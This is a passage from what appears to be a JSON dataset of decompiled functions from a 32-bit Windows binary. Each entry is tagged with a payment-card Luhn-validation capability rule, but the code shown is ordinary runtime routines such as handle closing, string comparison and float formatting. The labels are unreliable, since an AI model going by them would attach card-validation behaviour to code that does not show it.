*(in_EAX + 0x44);\n    if (unaff_ESI == 0) {\n        return 0xffffffff;\n    }\n    var_ch = 0;\n    uVar2 = fcn.0041cf45(&var_10h, 1, var_4h, 0x31, unaff_ESI + 4);\n    uVar3 = fcn.0041cf45(&var_10h, 1, var_4h, 0x32, unaff_ESI + 8);\n    uVar4 = fcn.0041cf45(&var_10h, 1, var_4h, 0x33, unaff_ESI + 0xc);\n    uVar5 = fcn.0041cf45(&var_10h, 1, var_4h, 0x34, unaff_ESI + 0x10);\n    uVar6 = fcn.0041cf45(&var_10h, 1, var_4h, 0x35, unaff_ESI + 0x14);\n    uVar7 = fcn.0041cf45(&var_10h, 1, var_4h, 0x36, unaff_ESI + 0x18);\n    uVar8 = fcn.0041cf45(&var_10h, 1, var_4h, 0x37, unaff_ESI);\n    uVar9 = fcn.0041cf45(&var_10h, 1, var_4h, 0x2a, unaff_ESI + 0x20);\n    uVar10 = fcn.0041cf45(&var_10h, 1, var_4h, 0x2b, unaff_ESI + 0x24);\n    uVar11 = fcn.0041cf45(&var_10h, 1, var_4h, 0x2c, unaff_ESI + 0x28);\n    uVar12 = fcn.0041cf45(&var_10h, 1, var_4h, 0x2d, unaff_ESI + 0x2c);\n    uVar13 = fcn.0041cf45(&var_10h, 1, var_4h, 0x2e, unaff_ESI + 0x30);\n    uVar14 = fcn.0041cf45(&var_10h, 1, var_4h, 0x2f, unaff_ESI + 0x34);\n    uVar15 = fcn.0041cf45(&var_10h, 1, var_4h, 0x30, unaff_ESI + 0x1c);\n    uVar16 = fcn.0041cf45(&var_10h, 1, var_4h, 0x44, unaff_ESI + 0x38);\n    uVar17 = fcn.0041cf45(&var_10h, 1, var_4h, 0x45, unaff_ESI + 0x3c);\n    uVar18 = fcn.0041cf45(&var_10h, 1, var_4h, 0x46, unaff_ESI + 0x40);\n    uVar19 = fcn.0041cf45(&var_10h, 1, var_4h, 0x47, unaff_ESI + 0x44);\n    uVar20 = fcn.0041cf45(&var_10h, 1, var_4h, 0x48, unaff_ESI + 0x48);\n    uVar21 = fcn.0041cf45(&var_10h, 1, var_4h, 0x49, unaff_ESI + 0x4c);\n    uVar22 = fcn.0041cf45(&var_10h, 1, var_4h, 0x4a, unaff_ESI + 0x50);\n    uVar23 = fcn.0041cf45(&var_10h, 1, var_4h, 0x4b, unaff_ESI + 0x54);\n    uVar24 = fcn.0041cf45(&var_10h, 1, var_4h, 0x4c, unaff_ESI + 0x58);\n    uVar25 = fcn.0041cf45(&var_10h, 1, var_4h, 0x4d, unaff_ESI + 0x5c);\n    uVar26 = fcn.0041cf45(&var_10h, 1, var_4h, 0x4e, unaff_ESI + 0x60);\n    uVar27 = fcn.0041cf45(&var_10h, 1, var_4h, 0x4f, unaff_ESI + 100);\n    uVar28 = fcn.0041cf45(&var_10h, 1, var_4h, 0x38, unaff_ESI + 0x68);\n    uVar29 = fcn.0041cf45(&var_10h, 1, var_4h, 0x39, unaff_ESI + 0x6c);\n    uVar30 = fcn.0041cf45(&var_10h, 1, var_4h, 0x3a, unaff_ESI + 0x70);\n    uVar31 = fcn.0041cf45(&var_10h, 1, var_4h, 0x3b, unaff_ESI + 0x74);\n    uVar32 = fcn.0041cf45(&var_10h, 1, var_4h, 0x3c, unaff_ESI + 0x78);\n    uVar33 = fcn.0041cf45(&var_10h, 1, var_4h, 0x3d, unaff_ESI + 0x7c);\n    uVar34 = fcn.0041cf45(&var_10h, 1, var_4h, 0x3e, unaff_ESI + 0x80);\n    uVar35 = fcn.0041cf45(&var_10h, 1, var_4h, 0x3f, unaff_ESI + 0x84);\n    uVar36 = fcn.0041cf45(&var_10h, 1, var_4h, 0x40, unaff_ESI + 0x88);\n    uVar37 = fcn.0041cf45(&var_10h, 1, var_4h, 0x41, unaff_ESI + 0x8c);\n    uVar38 = fcn.0041cf45(&var_10h, 1, var_4h, 0x42, unaff_ESI + 0x90);\n    uVar39 = fcn.0041cf45(&var_10h, 1, var_4h, 0x43, unaff_ESI + 0x94);\n    uVar40 = fcn.0041cf45(&var_10h, 1, var_4h, 0x28, unaff_ESI + 0x98);\n    uVar41 = fcn.0041cf45(&var_10h, 1, var_4h, 0x29, unaff_ESI + 0x9c);\n    uVar42 = fcn.0041cf45(&var_10h, 1, var_8h, 0x1f, unaff_ESI + 0xa0);\n    uVar43 = fcn.0041cf45(&var_10h, 1, var_8h, 0x20, unaff_ESI + 0xa4);\n    uVar44 = fcn.0041cf45(&var_10h, 1, var_8h, 0x1003, unaff_ESI + 0xa8);\n    uVar1 = var_8h;\n    uVar45 = fcn.0041cf45(&var_10h, 0, var_8h, 0x1009, unaff_ESI + 0xb0);\n    *(unaff_ESI + 0xac) = uVar1;\n    return uVar2 | uVar3 | uVar4 | uVar5 | uVar6 | uVar7 | uVar8 | uVar9 | uVar10 | uVar11 | uVar12 | uVar13 | uVar14 |\n           uVar15 | uVar16 | uVar17 | uVar18 | uVar19 | uVar20 | uVar21 | uVar22 | uVar23 | uVar24 | uVar25 | uVar26 |\n           uVar27 | uVar28 | uVar29 | uVar30 | uVar31 | uVar32 | uVar33 | uVar34 | uVar35 | uVar36 | uVar37 | uVar38 |\n           uVar39 | uVar40 | uVar41 | uVar42 | uVar43 | uVar44 | uVar45;\n}\n",
        "token_count": 2511
    },
    "0042210d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0042210d(uint32_t arg_8h)\n\n{\n    int32_t *piVar1;\n    int32_t *piVar2;\n    uint *puVar3;\n    int32_t iVar4;\n    uint uVar5;\n    \n    if ((-1 < arg_8h) && (arg_8h < *0x439dc0)) {\n        piVar1 = (arg_8h >> 5) * 4 + 0x439de0;\n        iVar4 = (arg_8h & 0x1f) * 0x40;\n        piVar2 = *piVar1 + iVar4;\n        if (((*(piVar2 + 1) & 1) != 0) && (*piVar2 != -1)) {\n            if (*0x435ba0 != 1) {\ncode_r0x0042216f:\n                *(iVar4 + *piVar1) = 0xffffffff;\n                return 0;\n            }\n            if (arg_8h == 0) {\n                uVar5 = 0xfffffff6;\n            }\n            else if (arg_8h == 1) {\n                uVar5 = 0xfffffff5;\n            }\n            else {\n                if (arg_8h != 2) goto code_r0x0042216f;\n                uVar5 = 0xfffffff4;\n            }\n            uVar5 = func_0x0043c1f0(uVar5, 0);\n            return uVar5;\n        }\n    }\n    puVar3 = fcn.004125de();\n    *puVar3 = 9;\n    puVar3 = fcn.004125f1();\n    *puVar3 = 0;\n    return 0xffffffff;\n}\n",
        "token_count": 388
    },
    "004233c9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.004233c9(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    uint *puVar1;\n    uint uVar2;\n    int32_t unaff_EBP;\n    uint var_20h;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.004146d8(0x4331a8, 0x14);\n    *(unaff_EBP + -0x1c) = 0;\n    puVar1 = *(unaff_EBP + 0x18);\n    if (((puVar1 == NULL) || (*puVar1 = 0xffffffff,  *(unaff_EBP + 8) == 0)) ||\n       ((*(unaff_EBP + 0x1c) != 0 && ((*(unaff_EBP + 0x14) & 0xfffffe7f) != 0)))) {\n        puVar1 = fcn.004125de();\n        *puVar1 = 0x16;\n        fcn.00415a3c(0, 0, 0, 0, 0);\n    }\n    else {\n        *(unaff_EBP + -4) = 0;\n        uVar2 = fcn.00422caa(unaff_EBP + -0x1c, *(unaff_EBP + 8), *(unaff_EBP + 0xc), *(unaff_EBP + 0x10), \n                             *(unaff_EBP + 0x14));\n        *(unaff_EBP + -0x20) = uVar2;\n        *(unaff_EBP + -4) = 0xfffffffe;\n        fcn.00423467();\n        if (*(unaff_EBP + -0x20) != 0) {\n            *puVar1 = 0xffffffff;\n        }\n    }\n    fcn.0041471d();\n    return;\n}\n",
        "token_count": 454
    },
    "00423495": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00423495(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    fcn.004233c9(arg_ch, arg_10h, arg_14h, arg_18h, arg_8h, 1);\n    return;\n}\n",
        "token_count": 77
    },
    "004234b5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.004234b5(uint8_t *arg_8h, uint8_t *arg_ch, int32_t arg_10h, uint arg_14h)\n\n{\n    uint8_t *puVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint32_t uVar4;\n    uint8_t *puVar5;\n    uint var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.0041102a(arg_14h);\n    if (arg_10h == 0) {\n        if (var_ch != '\\0') {\n            *(var_10h + 0x70) = *(var_10h + 0x70) & 0xfffffffd;\n        }\n        iVar2 = 0;\n    }\n    else if (*(var_14h + 8) == 0) {\n        iVar2 = fcn.00424916(arg_8h, arg_ch, arg_10h);\n        if (var_ch != '\\0') {\n            *(var_10h + 0x70) = *(var_10h + 0x70) & 0xfffffffd;\n        }\n    }\n    else if (arg_8h == NULL) {\n        puVar3 = fcn.004125de();\n        *puVar3 = 0x16;\n        fcn.00415a3c(0, 0, 0, 0, 0);\n        if (var_ch != '\\0') {\n            *(var_10h + 0x70) = *(var_10h + 0x70) & 0xfffffffd;\n        }\n        iVar2 = 0x7fffffff;\n    }\n    else {\n        if (arg_ch != NULL) {\n            do {\n                uVar4 = *arg_8h;\n                iVar2 = arg_10h + -1;\n                puVar1 = arg_8h + 1;\n                if ((*(uVar4 + 0x1d + var_14h) & 4) == 0) {\n                    if ((*(uVar4 + var_14h + 0x1d) & 0x10) != 0) {\n                        uVar4 = *(uVar4 + var_14h + 0x11d);\n                    }\n                    var_8h._0_2_ = uVar4;\n                    arg_8h = puVar1;\ncode_r0x00423625:\n                    uVar4 = *arg_ch;\n                    puVar5 = arg_ch + 1;\n                    if ((*(uVar4 + 0x1d + var_14h) & 4) == 0) {\n                        if ((*(uVar4 + var_14h + 0x1d) & 0x10) != 0) {\n                            uVar4 = *(uVar4 + var_14h + 0x11d);\n                        }\n                        goto code_r0x0042369f;\n                    }\n                    if (iVar2 == 0) {\ncode_r0x0042363f:\n                        arg_10h = iVar2;\n                        var_4h._0_2_ = 0;\n                    }\n                    else {\n                        iVar2 = arg_10h + -2;\n                        if (*puVar5 == 0) goto code_r0x0042363f;\n                        var_4h._0_2_ = CONCAT11(*arg_ch, *puVar5);\n                        puVar5 = arg_ch + 2;\n                        arg_10h = iVar2;\n                        if ((var_4h < *(var_14h + 0x10)) || (*(var_14h + 0x12) <= var_4h && var_4h != *(var_14h + 0x12))\n                           ) {\n                            if ((*(var_14h + 0x16) <= var_4h) &&\n                               (var_4h < *(var_14h + 0x18) || var_4h == *(var_14h + 0x18))) {\n                                var_4h._0_2_ = var_4h + *(var_14h + 0x1a);\n                            }\n                        }\n                        else {\n                            var_4h._0_2_ = var_4h + *(var_14h + 0x14);\n                        }\n                    }\n                }\n                else {\n                    if (iVar2 != 0) {\n                        if (*puVar1 == 0) {\n                            var_8h._0_2_ = 0;\n                            arg_8h = puVar1;\n                        }\n                        else {\n                            var_8h._0_2_ = CONCAT11(*arg_8h, *puVar1);\n                            arg_8h = arg_8h + 2;\n                            if ((var_8h < *(var_14h + 0x10)) ||\n                               (*(var_14h + 0x12) <= var_8h && var_8h != *(var_14h + 0x12))) {\n                                if ((*(var_14h + 0x16) <= var_8h) &&\n                                   (var_8h < *(var_14h + 0x18) || var_8h == *(var_14h + 0x18))) {\n                                    var_8h._0_2_ = var_8h + *(var_14h + 0x1a);\n                                }\n                            }\n                            else {\n                                var_8h._0_2_ = var_8h + *(var_14h + 0x14);\n                            }\n                        }\n                        goto code_r0x00423625;\n                    }\n                    uVar4 = *arg_ch;\n                    if ((*(uVar4 + 0x1d + var_14h) & 4) != 0) {\ncode_r0x004236b9:\n                        if (var_ch != '\\0') {\n                            *(var_10h + 0x70) = *(var_10h + 0x70) & 0xfffffffd;\n                        }\n                        return 0;\n                    }\n                    var_8h._0_2_ = 0;\n                    puVar5 = arg_ch;\n                    arg_8h = puVar1;\ncode_r0x0042369f:\n                    var_4h._0_2_ = uVar4;\n                    arg_10h = iVar2;\n                }\n                if (var_4h != var_8h) {\n                    iVar2 = (-(var_4h < var_8h) & 2) - 1;\n                    if (var_ch == '\\0') {\n                        return iVar2;\n                    }\n                    *(var_10h + 0x70) = *(var_10h + 0x70) & 0xfffffffd;\n                    return iVar2;\n                }\n                if ((var_8h == 0) || (arg_ch = puVar5,  arg_10h == 0)) goto code_r0x004236b9;\n            } while( true );\n        }\n        puVar3 = fcn.004125de();\n        *puVar3 = 0x16;\n        fcn.00415a3c(0, 0, 0, 0, 0);\n        if (var_ch != '\\0') {\n            *(var_10h + 0x70) = *(var_10h + 0x70) & 0xfffffffd;\n        }\n        iVar2 = 0x7fffffff;\n    }\n    return iVar2;\n}\n",
        "token_count": 1682
    },
    "00424dfc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00424dfc(uint *arg_8h)\n\n{\n    uint *puVar1;\n    uint uVar2;\n    \n    if (arg_8h == NULL) {\n        puVar1 = fcn.004125de();\n        *puVar1 = 0x16;\n        fcn.00415a3c(0, 0, 0, 0, 0);\n        uVar2 = 0x16;\n    }\n    else {\n        *arg_8h = *0x439bb8;\n        uVar2 = 0;\n    }\n    return uVar2;\n}\n",
        "token_count": 137
    },
    "00426296": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_74h\n// WARNING: Removing unreachable block (ram,0x004267d1)\n// WARNING: Removing unreachable block (ram,0x004267db)\n// WARNING: Removing unreachable block (ram,0x004267e0)\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl\nfcn.00426296(uint32_t arg_8h, uint32_t noname_1, uint32_t noname_2, int32_t arg_14h, uint32_t arg_18h, int16_t *arg_1ch)\n\n{\n    int16_t *piVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    bool bVar5;\n    int32_t iVar6;\n    uint16_t *puVar7;\n    uint16_t uVar8;\n    uint16_t uVar9;\n    int32_t *piVar10;\n    uint32_t uVar11;\n    uint16_t uVar12;\n    uint32_t uVar13;\n    char cVar14;\n    uint32_t uVar15;\n    int16_t *piVar16;\n    int16_t *piVar17;\n    uint16_t uVar18;\n    uint16_t uVar19;\n    uint32_t uVar20;\n    uint *puVar21;\n    char *pcVar22;\n    uint var_74h;\n    uint var_70h;\n    uint16_t *var_6ch;\n    int32_t *var_68h;\n    int32_t var_64h;\n    uint var_60h;\n    uint var_5ch;\n    int32_t var_58h;\n    int32_t var_54h;\n    int32_t var_50h;\n    uint var_4ch;\n    uint16_t *var_48h;\n    int32_t var_44h;\n    int32_t var_40h;\n    uint var_3ch;\n    uint var_38h;\n    int32_t var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uchar var_28h;\n    uchar var_27h;\n    uchar var_26h;\n    uchar var_25h;\n    uint var_20h;\n    uint16_t var_1ch;\n    uint32_t var_1ah;\n    uint var_16h;\n    uint var_10h;\n    uint32_t var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    var_4h = *0x435b90 ^ &stack0xfffffffc;\n    var_10h._0_1_ = arg_8h;\n    var_10h._1_1_ = arg_8h >> 8;\n    var_10h._2_2_ = arg_8h >> 0x10;\n    var_ch._0_2_ = noname_1;\n    var_ch._2_2_ = noname_1 >> 0x10;\n    var_8h._0_2_ = noname_2;\n    uVar8 = var_8h & 0x8000;\n    uVar13 = noname_2 & 0x7fff;\n    var_30h = 0xcccccccc;\n    var_2ch = 0xcccccccc;\n    var_28h = 0xcc;\n    var_27h = 0xcc;\n    var_26h = 0xfb;\n    var_25h = 0x3f;\n    if ((noname_2 & 0x8000) == 0) {\n        *(arg_1ch + 1) = 0x20;\n    }\n    else {\n        *(arg_1ch + 1) = 0x2d;\n    }\n    if (((uVar13 == 0) && (noname_1 == 0)) && (arg_8h == 0)) {\n        *arg_1ch = 0;\n        *(arg_1ch + 1) = ((uVar8 != 0x8000) - 1U & 0xd) + 0x20;\n        *(arg_1ch + 3) = 1;\n        *(arg_1ch + 2) = 0x30;\n        *(arg_1ch + 5) = 0;\n        goto code_r0x00426b6e;\n    }\n    if (uVar13 == 0x7fff) {\n        *arg_1ch = 1;\n        var_ch = noname_1;\n        if (((noname_1 == 0x80000000) && (arg_8h == 0)) || ((noname_1 & 0x40000000) != 0)) {\n            if (((noname_2 & 0x8000) == 0) || (noname_1 != 0xc0000000)) {\n                if ((noname_1 != 0x80000000) || (arg_8h != 0)) goto code_r0x004263cc;\n                pcVar22 = \"1#INF\";\n            }\n            else {\n                if (arg_8h != 0) {\ncode_r0x004263cc:\n                    pcVar22 = \"1#QNAN\";\n                    goto code_r0x004263d1;\n                }\n                pcVar22 = \"1#IND\";\n            }\n            iVar6 = fcn.0041291c(arg_1ch + 2, 0x16, pcVar22);\n            if (iVar6 != 0) {\n                fcn.00415914(0, 0, 0, 0, 0);\n            }\n            *(arg_1ch + 3) = 5;\n            noname_1 = var_ch;\n        }\n        else {\n            pcVar22 = \"1#SNAN\";\ncode_r0x004263d1:\n            iVar6 = fcn.0041291c(arg_1ch + 2, 0x16, pcVar22);\n            noname_1 = var_ch;\n            if (iVar6 != 0) {\n                fcn.00415914(0, 0, 0, 0, 0);\n                noname_1 = var_ch;\n            }\n            *(arg_1ch + 3) = 6;\n        }\n        goto code_r0x00426b6e;\n    }\n    var_4ch._0_2_ = ((uVar13 >> 8) + (noname_1 >> 0x18) * 2) * 0x4d + -0x134312f4 + uVar13 * 0x4d10 >> 0x10;\n    uVar15 = var_4ch;\n    var_20h._0_2_ = 0;\n    var_16h._0_1_ = uVar13;\n    var_16h._1_1_ = uVar13 >> 8;\n    var_1ah._0_2_ = var_ch;\n    var_1ah._2_2_ = var_ch._2_2_;\n    var_20h._2_2_ = arg_8h;\n    var_64h = 0x436ba8;\n    var_1ch = var_10h._2_2_;\n    var_1ah = noname_1;\n    if (-uVar15 != 0) {\n        uVar13 = -uVar15;\n        uVar11 = arg_8h;\n        if (0 < uVar15) {\n            var_64h = 0x436d08;\n            uVar13 = uVar15;\n        }\njoined_r0x0042645f:\n        var_1ch = uVar11 >> 0x10;\n        arg_8h = uVar11 & 0xffff | var_10h._2_2_ << 0x10;\n        if (uVar13 != 0) {\n            var_64h = var_64h + 0x54;\n            uVar15 = uVar13 & 7;\n            uVar13 = uVar13 >> 3;\n            if (uVar15 != 0) {\n                piVar10 = uVar15 * 0xc + var_64h;\n                if (0x7fff < *piVar10) {\n                    var_3ch._0_2_ = *piVar10;\n                    var_3ch._2_2_ = *piVar10 >> 0x10;\n                    piVar2 = piVar10 + 2;\n                    var_38h._0_2_ = piVar10[1];\n                    var_38h._2_2_ = piVar10[1] >> 0x10;\n                    piVar10 = &var_3ch;\n                    var_34h = *piVar2;\n                    iVar6 = CONCAT22(var_38h, var_3ch._2_2_) + -1;\n                    var_3ch._2_2_ = iVar6;\n                    var_38h._0_2_ = iVar6 >> 0x10;\n                }\n                var_54h = 0;\n                var_10h._0_1_ = 0;\n                var_10h._1_1_ = 0;\n                var_10h._2_2_ = 0;\n                var_ch._0_2_ = 0;\n                var_ch._2_2_ = 0;\n                var_8h._0_2_ = 0;\n                var_8h._2_2_ = 0;\n                uVar18 = (*(piVar10 + 10) ^ CONCAT11(var_16h._1_1_, var_16h)) & 0x8000;\n                uVar9 = CONCAT11(var_16h._1_1_, var_16h) & 0x7fff;\n                uVar12 = *(piVar10 + 10) & 0x7fff;\n                uVar19 = uVar12 + uVar9;\n                if (((uVar9 < 0x7fff) && (uVar12 < 0x7fff)) && (uVar19 < 0xbffe)) {\n                    if (0x3fbf < uVar19) {\n                        if (((uVar9 == 0) &&\n                            (uVar19 = uVar19 + 1, \n                            (CONCAT13(var_16h._1_1_, CONCAT12(var_16h, var_1ah >> 0x10)) & 0x7fffffff) == 0)) &&\n                           ((CONCAT22(var_1ah, var_1ch) == 0 && (CONCAT22(uVar11, var_20h) == 0)))) {\n                            var_16h._0_1_ = 0;\n                            var_16h._1_1_ = 0;\n                            noname_1 = 0;\n                            goto joined_r0x0042645f;\n                        }\n                        if ((((uVar12 != 0) || (uVar19 = uVar19 + 1,  (piVar10[2] & 0x7fffffffU) != 0)) ||\n                            (piVar10[1] != 0)) || (*piVar10 != 0)) {\n                            var_58h = 0;\n                            puVar21 = &var_ch;\n                            var_40h = 5;\n                            do {\n                                var_50h = var_40h;\n                                if (0 < var_40h) {\n                                    var_6ch = &var_20h + var_58h * 2;\n                                    var_68h = piVar10 + 2;\n                                    do {\n                                        bVar5 = false;\n                                        uVar15 = puVar21[-1] + *var_6ch * *var_68h;\n                                        if ((uVar15 < puVar21[-1]) || (uVar15 < *var_6ch * *var_68h)) {\n                                            bVar5 = true;\n                                        }\n                                        puVar21[-1] = uVar15;\n                                        if (bVar5) {\n                                            *puVar21 = *puVar21 + 1;\n                                        }\n                                        var_6ch = var_6ch + 1;\n                                        var_68h = var_68h + -2;\n                                        var_50h = var_50h + -1;\n                                    } while (0 < var_50h);\n                                }\n                                puVar21 = puVar21 + 2;\n                                var_58h = var_58h + 1;\n                                var_40h = var_40h + -1;\n                            } while (0 < var_40h);\n                            uVar19 = uVar19 + 0xc002;\n                            if (uVar19 < 1) {\ncode_r0x00426612:\n                                uVar19 = uVar19 - 1;\n                                if (uVar19 < 0) {\n                                    uVar15 = -uVar19;\n                                    uVar19 = 0;\n                                    do {\n                                        if ((var_10h & 1) != 0) {\n                                            var_54h = var_54h + 1;\n                                        }\n                                        iVar3 = CONCAT22(var_8h._2_2_, var_8h);\n                                        uVar11 = CONCAT22(var_ch._2_2_, var_ch);\n                                        iVar6 = CONCAT22(var_ch._2_2_, var_ch);\n                                        var_8h._0_2_ = CONCAT22(var_8h._2_2_, var_8h) >> 1;\n                                        var_8h._2_2_ = var_8h._2_2_ >> 1;\n                                        var_ch._2_2_ = var_ch._2_2_ >> 1 | (iVar3 << 0x1f) >> 0x10;\n                                        uVar20 = CONCAT22(var_10h._2_2_, CONCAT11(var_10h._1_1_, var_10h)) >> 1;\n                                        var_10h._2_2_ = var_10h._2_2_ >> 1 | (iVar6 << 0x1f) >> 0x10;\n                                        uVar15 = uVar15 - 1;\n                                        var_ch._0_2_ = uVar11 >> 1;\n                                        var_10h._0_1_ = uVar20;\n                                        var_10h._1_1_ = uVar20 >> 8;\n                                    } while (uVar15 != 0);\n                                    if (var_54h != 0) {\n                                        var_10h._0_1_ = var_10h | 1;\n                                    }\n                                }\n                            }\n                            else {\n                                do {\n                                    uVar12 = var_ch._2_2_;\n                                    uVar9 = var_10h._2_2_;\n                                    if ((var_8h._2_2_ & 0x8000) != 0) break;\n                                    iVar6 = CONCAT22(var_10h._2_2_, CONCAT11(var_10h._1_1_, var_10h)) << 1;\n                                    var_10h._0_1_ = iVar6;\n                                    var_10h._1_1_ = iVar6 >> 8;\n                                    var_10h._2_2_ = iVar6 >> 0x10;\n                                    iVar6 = CONCAT22(var_ch._2_2_, var_ch) * 2;\n                                    var_ch._0_2_ = iVar6 | uVar9 >> 0xf;\n                                    var_ch._2_2_ = iVar6 >> 0x10;\n                                    iVar6 = CONCAT22(var_8h._2_2_, var_8h) * 2;\n                                    var_8h._0_2_ = iVar6 | uVar12 >> 0xf;\n                                    uVar19 = uVar19 - 1;\n                                    var_8h._2_2_ = iVar6 >> 0x10;\n                                } while (0 < uVar19);\n                                if (uVar19 < 1) goto code_r0x00426612;\n                            }\n                            if ((0x8000 < CONCAT11(var_10h._1_1_, var_10h)) ||\n                               ((CONCAT22(var_10h._2_2_, CONCAT11(var_10h._1_1_, var_10h)) & 0x1ffff) == 0x18000)) {\n                                if (CONCAT22(var_ch, var_10h._2_2_) == -1) {\n                                    var_10h._2_2_ = 0;\n                                    var_ch._0_2_ = 0;\n                                    if (CONCAT22(var_8h, var_ch._2_2_) == -1) {\n                                        var_ch._2_2_ = 0;\n                                        var_8h._0_2_ = 0;\n                                        if (var_8h._2_2_ == 0xffff) {\n                                            var_8h._2_2_ = 0x8000;\n                                            uVar19 = uVar19 + 1;\n                                        }\n                                        else {\n                                            var_8h._2_2_ = var_8h._2_2_ + 1;\n                                        }\n                                    }\n                                    else {\n                                        iVar6 = CONCAT22(var_8h, var_ch._2_2_) + 1;\n                                        var_ch._2_2_ = iVar6;\n                                        var_8h._0_2_ = iVar6 >> 0x10;\n                                    }\n                                }\n                                else {\n                                    iVar6 = CONCAT22(var_ch, var_10h._2_2_) + 1;\n                                    var_10h._2_2_ = iVar6;\n                                    var_ch._0_2_ = iVar6 >> 0x10;\n                                }\n                            }\n                            noname_1 = CONCAT22(var_ch._2_2_, var_ch);\n                            if (uVar19 < 0x7fff) {\n                                var_16h._1_1_ = uVar19 >> 8 | uVar18 >> 8;\n                                var_20h._0_2_ = var_10h._2_2_;\n                                var_20h._2_2_ = var_ch;\n                                var_1ch = var_ch._2_2_;\n                                uVar11 = CONCAT22(var_ch._2_2_, var_ch);\n                                var_1ah._0_2_ = var_8h;\n                                var_1ah._2_2_ = var_8h._2_2_;\n                                var_1ah = CONCAT22(var_8h._2_2_, var_8h);\n                                var_16h._0_1_ = uVar19;\n                            }\n                            else {\n                                var_1ch = 0;\n                                var_1ah._0_2_ = 0;\n                                var_20h._0_2_ = 0;\n                                var_20h._2_2_ = 0;\n                                uVar11 = 0;\n                                iVar6 = ((uVar18 == 0) - 1 & 0x80000000) + 0x7fff8000;\n                                var_1ah._2_2_ = iVar6;\n                                var_1ah = 0x80000000;\n                                var_16h._0_1_ = iVar6 >> 0x10;\n                                var_16h._1_1_ = iVar6 >> 0x18;\n                                noname_1 = CONCAT22(var_ch._2_2_, var_ch);\n                            }\n                            goto joined_r0x0042645f;\n                        }\n                    }\n                    var_1ah._2_2_ = 0;\n                    var_16h._0_1_ = 0;\n                    var_16h._1_1_ = 0;\n                }\n                else {\n                    iVar6 = ((uVar18 == 0) - 1 & 0x80000000) + 0x7fff8000;\n                    var_1ah._2_2_ = iVar6;\n                    var_16h._0_1_ = iVar6 >> 0x10;\n                    var_16h._1_1_ = iVar6 >> 0x18;\n                }\n                var_1ch = 0;\n                var_1ah._0_2_ = 0;\n                var_1ah = var_1ah._2_2_ << 0x10;\n                var_20h._0_2_ = 0;\n                var_20h._2_2_ = 0;\n                uVar11 = 0;\n                noname_1 = 0;\n            }\n            goto joined_r0x0042645f;\n        }\n    }\n    var_1ah._2_2_ = var_1ah >> 0x10;\n    var_20h._2_2_ = arg_8h;\n    uVar13 = CONCAT13(var_16h._1_1_, CONCAT12(var_16h, var_1ah._2_2_));\n    if (0x3ffe < uVar13 >> 0x10) {\n        var_4ch._0_2_ = var_4ch + 1;\n        var_50h = 0;\n        var_10h._0_1_ = 0;\n        var_10h._1_1_ = 0;\n        var_10h._2_2_ = 0;\n        arg_8h = arg_8h & 0xffff;\n        var_ch._0_2_ = 0;\n        var_ch._2_2_ = 0;\n        var_8h._0_2_ = 0;\n        var_8h._2_2_ = 0;\n        uVar13 = uVar13 >> 0x10 & 0x7fff;\n        iVar6 = uVar13 + 0x3ffb;\n        if ((uVar13 < 0x7fff) && (iVar6 < 0xbffe)) {\n            if (0x3fbf < iVar6) {\n                if ((((uVar13 == 0) &&\n                     (iVar6 = uVar13 + 0x3ffc, \n                     (CONCAT13(var_16h._1_1_, CONCAT12(var_16h, var_1ah._2_2_)) & 0x7fffffff) == 0)) &&\n                    (CONCAT22(var_1ah, var_1ch) == 0)) && (CONCAT22(var_20h._2_2_, var_20h) == 0)) {\n                    var_16h._0_1_ = 0;\n                    var_16h._1_1_ = 0;\n                    noname_1 = 0;\n                    goto code_r0x004269a6;\n                }\n                var_58h = 0;\n                puVar21 = &var_ch;\n                var_40h = 5;\n                do {\n                    var_54h = var_40h;\n                    if (0 < var_40h) {\n                        var_48h = &var_28h;\n                        puVar7 = &var_20h + var_58h * 2;\n                        do {\n                            bVar5 = false;\n                            uVar13 = puVar21[-1] + *var_48h * *puVar7;\n                            if ((uVar13 < puVar21[-1]) || (uVar13 < *var_48h * *puVar7)) {\n                                bVar5 = true;\n                            }\n                            puVar21[-1] = uVar13;\n                            if (bVar5) {\n                                *puVar21 = *puVar21 + 1;\n                            }\n                            var_48h = var_48h + -1;\n                            puVar7 = puVar7 + 1;\n                            var_54h = var_54h + -1;\n                        } while (0 < var_54h);\n                    }\n                    puVar21 = puVar21 + 2;\n                    var_58h = var_58h + 1;\n                    var_40h = var_40h + -1;\n                } while (0 < var_40h);\n                iVar6 = iVar6 + 0xc002;\n                if (iVar6 < 1) {\ncode_r0x0042689f:\n                    uVar19 = iVar6 + 0xffff;\n                    if (uVar19 < 0) {\n                        uVar13 = -(iVar6 + 0xffff) & 0xffff;\n                        uVar19 = uVar19 + uVar13;\n                        do {\n                            if ((var_10h & 1) != 0) {\n                                var_50h = var_50h + 1;\n                            }\n                            iVar3 = CONCAT22(var_8h._2_2_, var_8h);\n                            uVar15 = CONCAT22(var_ch._2_2_, var_ch);\n                            iVar6 = 